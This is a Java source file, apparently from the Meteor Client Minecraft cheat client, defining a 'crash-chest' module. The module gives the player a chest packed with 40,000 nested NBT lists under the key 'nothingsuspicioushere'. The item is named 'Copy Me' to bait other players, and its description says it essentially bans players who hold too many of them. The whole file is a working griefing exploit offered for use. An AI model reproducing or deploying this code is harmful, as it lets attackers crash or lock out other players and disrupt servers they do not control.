package minegame159.meteorclient.modules.creative;

import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.text.LiteralText;

public class CrashChest extends GiveItemModule {
    public CrashChest() {
        super("crash-chest", "Gives a chest with a lot of NBT. Essentially bans players with too many of these");
    }

    @Override
    ItemStack getStack() {
        ItemStack stack = new ItemStack(Items.CHEST);
        CompoundTag nbtCompound = new CompoundTag();
        ListTag nbtList = new ListTag();
        for(int i = 0; i < 40000; i++)
            nbtList.add(new ListTag());
        nbtCompound.put("nothingsuspicioushere", nbtList);
        stack.setTag(nbtCompound);
        stack.setCustomName(new LiteralText("Copy Me"));
        return stack;
    }
}
